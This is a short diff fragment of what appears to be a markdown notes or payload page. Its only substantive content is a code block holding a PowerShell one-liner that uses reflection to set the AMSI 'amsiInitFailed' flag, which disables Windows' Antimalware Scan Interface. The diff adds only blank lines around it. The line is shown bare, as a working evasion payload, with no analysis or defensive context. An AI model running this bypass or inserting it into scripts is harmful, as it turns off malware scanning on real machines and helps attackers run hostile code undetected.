@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:36:19.036393+00:00'
 ```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
+
+
